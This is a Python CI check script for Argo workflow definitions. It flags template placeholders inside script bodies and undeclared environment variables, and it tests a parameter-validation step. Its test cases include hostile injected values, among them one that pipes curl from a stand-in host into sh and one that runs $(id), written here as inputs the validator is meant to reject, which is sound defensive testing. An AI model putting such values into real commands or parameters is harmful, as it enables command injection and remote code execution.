#!/usr/bin/env python3
"""Check the Argo workflows in infrastructure/argo-workflows.

1. No {{inputs.parameters.*}} / {{workflow.*}} placeholder inside a multi-line
   script body (container args block or script source). Argo pastes the raw
   value into the script before the shell or Python parses it, so a crafted
   value (tenant id, folder, payload) becomes code. Pass values as env vars
   (env: - name: PARAM_X, value: "{{inputs.parameters.x}}") and read "$PARAM_X"
   or os.environ["PARAM_X"].
2. Every PARAM_* / WF_PARAM_* / WF_* variable a body reads is declared in that
   container's env.
3. Shell bodies pass `sh -n` / `bash -n`; Python bodies compile.
4. tenant-onboarding's validate-parameters step refuses malformed parameters
   (run here against good and hostile values).

Usage: scripts/ci/check-argo-workflows.py [workflow-dir]
"""
import glob
import os
import re
import subprocess
import sys

import yaml

ROOT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..", "infrastructure", "argo-workflows")
PLACEHOLDER = re.compile(r"\{\{\s*(inputs\.parameters|workflow\.)")
ENV_REF = re.compile(r"\b((?:WF_)?PARAM_[A-Z0-9_]+|WF_(?:NAME|STATUS|CREATION_TIMESTAMP))\b")

problems = []
validate_body = None

for path in sorted(glob.glob(os.path.join(ROOT, "*.yaml"))):
    name = os.path.basename(path)
    with open(path) as fh:
        docs = [d for d in yaml.safe_load_all(fh) if d]
    for doc in docs:
        spec = doc.get("spec") or {}
        spec = spec.get("workflowSpec", spec)
        for template in spec.get("templates") or []:
            for kind in ("container", "script"):
                c = template.get(kind)
                if not c:
                    continue
                command = " ".join(c.get("command") or [])
                bodies = [a for a in (c.get("args") or []) if isinstance(a, str) and "\n" in a]
                if kind == "script" and c.get("source"):
                    bodies.append(c["source"])
                env = {e["name"] for e in c.get("env") or []}
                where = f"{name}: template {template['name']}"
                for body in bodies:
                    if PLACEHOLDER.search(body):
                        problems.append(f"{where}: Argo placeholder inside the script body (pass it as an env var)")
                    for var in sorted(set(ENV_REF.findall(body)) - env):
                        problems.append(f"{where}: reads ${var} but the container env does not declare it")
                    if "python" in command:
                        try:
                            compile(body, where, "exec")
                        except SyntaxError as ex:
                            problems.append(f"{where}: Python syntax error: {ex}")
                    else:
                        shell = "bash" if "bash" in command else "sh"
                        r = subprocess.run([shell, "-n"], input=body, text=True, capture_output=True)
                        if r.returncode:
                            problems.append(f"{where}: {shell} -n: {r.stderr.strip()}")
                    if template["name"] == "validate-parameters":
                        validate_body = body

if validate_body is None:
    problems.append("tenant-onboarding.yaml: validate-parameters step is missing")
else:
    good = dict(TENANT_ID="acme-health-1a2b3c4d", SUBSCRIPTION_TIER="starter", ENABLED_MODULES="claims,eligibility",
                PAYMENT_METHOD_ID="pm_123abc", ADMIN_EMAIL="admin@acme.example", TENANT_NAME="Acme",
                ORGANIZATION_NAME="Acme Org", BILLING_NAME="Acme", ADMIN_NAME="Ann", PHONE="+1 555 0100")
    cases = [
        ({}, True),
        ({"PAYMENT_METHOD_ID": "", "ADMIN_EMAIL": ""}, True),
        ({"TENANT_ID": 'x"; curl evil | sh; "'}, False),
        ({"TENANT_ID": "abc\n$(id)"}, False),
        ({"TENANT_ID": ""}, False),
        ({"TENANT_ID": "Upper-Case"}, False),
        ({"TENANT_ID": "a" * 53}, False),
        ({"SUBSCRIPTION_TIER": "gold"}, False),
        ({"ENABLED_MODULES": "claims' || true"}, False),
        ({"PAYMENT_METHOD_ID": "pm_1/../x"}, False),
        ({"ORGANIZATION_NAME": "x\ny"}, False),
        ({"ADMIN_EMAIL": "a b@c.example"}, False),
    ]
    for override, accepted in cases:
        r = subprocess.run(["sh", "-c", validate_body], env={**os.environ, **good, **override},
                           capture_output=True, text=True)
        if (r.returncode == 0) != accepted:
            problems.append(f"validate-parameters {'refused' if accepted else 'accepted'} {override!r}")

for p in problems:
    print(f"::error::{p}")
print(f"{len(problems)} problem(s)")
sys.exit(1 if problems else 0)
